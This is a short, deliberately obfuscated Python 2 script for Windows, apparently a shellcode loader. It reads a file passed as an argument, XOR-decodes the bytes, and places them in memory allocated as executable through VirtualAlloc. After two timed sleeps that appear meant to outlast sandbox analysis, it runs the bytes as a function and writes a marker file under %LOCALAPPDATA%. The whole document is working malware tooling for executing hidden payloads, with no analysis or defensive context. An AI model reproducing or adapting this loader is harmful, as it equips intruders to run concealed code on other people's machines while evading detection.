import ctypes
import sys
import os
import time
def RHLDKMOHDFs10(CA1,zUX2):
        return "".join(chr(ord(qvNY3)^ord(wzJuA4)) for qvNY3,wzJuA4 in zip(CA1,zUX2))
with open(sys.argv[1], "rb") as JNFJzD5:
        TbdSZoxd7 = JNFJzD5.read()
RWLRGQT6 = RHLDKMOHDFs10(TbdSZoxd7[0], TbdSZoxd7[1])
ujYdZYPUD8 = "".join(
    RHLDKMOHDFs10(TbdSZoxd7[i + 2], RWLRGQT6)
    for i in xrange(len(TbdSZoxd7) - 2))
AntzPGGMFO9 = ctypes.windll.kernel32.VirtualAlloc(0, len(ujYdZYPUD8), 0x1000, 0x40)
time.sleep(12)
ctypes.memmove(AntzPGGMFO9, ujYdZYPUD8, len(ujYdZYPUD8))
time.sleep(17)
ctypes.CFUNCTYPE(ctypes.c_int)(AntzPGGMFO9)()
with open(os.environ['localappdata'] + "\abc.txt", "w") as outfile:
        outfile.writelines("python ended")